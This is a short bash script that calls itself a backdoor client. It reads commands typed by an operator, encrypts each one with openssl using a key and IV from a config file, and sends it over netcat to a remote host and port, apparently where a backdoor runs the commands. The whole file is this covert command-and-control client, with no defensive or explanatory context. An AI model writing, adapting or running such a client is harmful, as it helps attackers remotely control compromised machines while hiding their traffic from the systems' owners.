#! /bin/bash

cd "$(dirname "$0")"
BASE_DIR="$(pwd)"
CONTINUE=true

# Load common configuration
. ./config.sh
. ./lib.sh

# Manage different system's signals
on_exit ()
{
	# rm -f $FIFO_PATH pipe.lock
	if [ $1 -eq 0 ]; then
		echo "$0 ending with success (status code: $1)" >&2
	else
		echo "$0 ending with some error (status code: $1)"
	fi
}

trap 'on_exit $?' EXIT

on_interrupt ()
{
	exit 1
}

trap on_interrupt INT TERM

# TODO: Check random port to connect to backdoor (port's range used in config)
while $CONTINUE; do
	echo "Notice: Type 'quit'|'q'|'exit' to close backdoor client"
	echo "prompt > "
	read INPUT
	if [[ ( "quit" == "$INPUT" ) || \
      		( "q" == "$INPUT" ) || \
      		( "exit" == "$INPUT" ) ]]
	then
		CONTINUE=false
	else
		echo $INPUT | $OPENSSL enc -a -$CRYPT_METHOD -iv $IV -K $PRIVKEY | $NC $HOST $PORT 2> /dev/null
	fi
	echo ""
done

exit 0
